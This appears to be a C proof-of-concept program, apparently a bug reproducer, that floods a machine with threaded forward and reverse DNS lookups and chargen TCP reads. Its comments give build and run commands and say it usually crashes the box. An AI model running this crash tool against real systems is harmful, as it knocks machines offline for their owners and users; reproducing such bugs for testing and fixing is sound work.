#define HOSTNAME "server1b"  /* For forward DNS & chargen */
                                         /* Best to use a machine besides */
                                         /* the one on which we're running */

#define IP_ADDRESS "192.168.2.1"        /* for reverse DNS */

#define CHARGEN_PORT 19                  /* Probably don't need to change */

#define NUMTIMES 5                       /* How many of each thread type to */
                                         /*   create -- you may need to     */
                                         /*   adjust this higher especially */
                                         /*   if you have a fast box/network*/



/*
  2) Type:  gcc -o crash -lpthread crash.c 
  3) Type: ./crash

    This crashes, usually generating kernel syslogs and/or crashing the box.
*/

#include <arpa/inet.h>
#include <assert.h>
#include <netdb.h>
#include <netinet/in.h>
#include <errno.h>
/* #include <poll.h> */
#include <pthread.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define MAXHOSTENT 16384

static pthread_t spawnThread(void *(*function)(void *))
{
    pthread_t tid;
    pthread_attr_t attr;

    /* sanity */
    if (!function) { return 0; }

    /* Initialize thread attributes */
 
    assert(!pthread_attr_init(&attr));
    assert(!pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED));
    assert(!pthread_attr_setscope(&attr, PTHREAD_SCOPE_SYSTEM));
    assert(!pthread_create(&tid, &attr, function, 0));
    assert(!pthread_attr_destroy(&attr));

    return tid;
}

void *reverseDNS(void *arg) 
{
    struct hostent ent;
    struct hostent *pRes =  0;
    char *buf = (char *)malloc(sizeof(char) * MAXHOSTENT);
    int err, IP;       

    while (1) {
	IP = inet_addr(IP_ADDRESS);
	assert (!gethostbyaddr_r((char *)(&IP), sizeof(int), 
				 AF_INET, &ent, buf, MAXHOSTENT, &pRes, &err));
    }

    free(buf);
    return 0;
}

void *forwardDNS(void *arg)
{
    int err;
    char *buf = (char *)malloc(sizeof(char) * MAXHOSTENT);
    struct hostent ent;
    struct hostent *pRes = 0;

    memset(buf, 0, MAXHOSTENT);

    while(1) {
	assert(!gethostbyname_r(HOSTNAME, &ent, buf, MAXHOSTENT, &pRes, &err));
    }

    free(buf);
    return 0;
}

void *generateTraffic(void *arg) 
{
    /* Look up the IP */
    struct hostent hp, *pRes;
    char *buf = (char *)malloc(sizeof(char) * MAXHOSTENT);
    int err, fd;
    struct sockaddr_in location;
    char buffer[1024];

    assert(!gethostbyname_r(HOSTNAME, &hp, buf,
                           MAXHOSTENT * sizeof(char), &pRes, &err));
    memset(&location, 0, sizeof(location));
    location.sin_family = AF_INET;
    memcpy(&location.sin_addr.s_addr, pRes->h_addr_list[0],
             sizeof(location.sin_addr.s_addr));
    location.sin_port = htons(CHARGEN_PORT);
    free(buf);

    /* Create a socket & connect */
    assert((fd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) != -1);
    assert(connect(fd, (struct sockaddr *)(&location),
                  sizeof(location)) != -1);
  
    while (1) {
	assert(read(fd, buffer, 1024) != -1);
    }

    return 0;
}
	
int main(int argc, char **argv) 
{
    int i;
    for (i = 0; i < NUMTIMES; i++) {
	spawnThread(forwardDNS);
	spawnThread(reverseDNS);
	spawnThread(generateTraffic);
    }

    /* Sleep without generating signals */
    poll(0, 0, 60 * 1000);

    return EXIT_SUCCESS;
}
